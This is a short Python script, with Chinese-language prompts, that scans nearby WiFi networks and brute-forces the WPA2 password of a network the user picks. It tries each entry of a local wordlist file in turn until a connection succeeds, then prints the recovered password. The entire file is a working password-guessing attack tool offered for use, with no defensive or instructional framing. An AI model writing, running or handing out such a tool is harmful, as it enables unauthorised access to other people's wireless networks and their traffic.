from pywifi import PyWiFi,const, Profile
import time

def check_wifi(iface):
    iface.scan()
    print("---扫描周围WiFi中---")
    time.sleep(1)
    for i in iface.scan_results():
        print("WiFi名称:"+i.ssid.encode("raw_unicode_escape").decode()+",信号强度:",str(i.signal+100)+"%")
def connect_wifi(iface,pwd,wifi_name):
    profile=Profile()
    profile.ssid = wifi_name.encode().decode('GBK')
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.auth=const.AUTH_ALG_OPEN
    profile.cipher=const.CIPHER_TYPE_CCMP
    profile.key=pwd
    iface.remove_all_network_profiles()
    test_profiles=iface.add_network_profile(profile)
    iface.connect(test_profiles)
    time.sleep(1)
    if iface.status() == const.IFACE_CONNECTED:
        return True   
    else:
        return False
if __name__=="__main__":
    wifi=PyWiFi()
    iface=wifi.interfaces()[0]
    if iface.status()==const.IFACE_CONNECTED:
        print("请断开wifi，再尝试运行!")
        status=input("如果断开WiFi可以输入1，退出脚本请按任意键:")
        if status.strip("")=="1":
            iface.disconnect()
            print("---断开WiFi中---")
            time.sleep(1)
            check_wifi(iface)
            wifi_name=input("请输入想破解wifi名称:")
            print("---开始破解---")
            with open("./密码本.txt","r") as f:
                while True:
                    pwd=f.readline().strip("\n")
                    if not pwd:
                        break
                    elif connect_wifi(iface,pwd,wifi_name):
                        print("破解成功，密码为:",pwd)
                        input("按任意键退出!")
                        break
                    else:
                        print("破解失败")                   
        else:
            pass
    elif iface.status()==const.IFACE_DISCONNECTED:
        check_wifi(iface)
        wifi_name=input("请输入想破解wifi名称:")
        print("---开始破解---")
        with open("./密码本.txt","r") as f:
            while True:
                pwd=f.readline().strip("\n")
                if not pwd:
                    break
                elif connect_wifi(iface,pwd,wifi_name):
                    print("破解成功，密码为:",pwd)
                    break
                else:
                    print("破解失败")        
    else:
        print("当前网卡状态异常!!!\n请重新运行")
        time.sleep(1)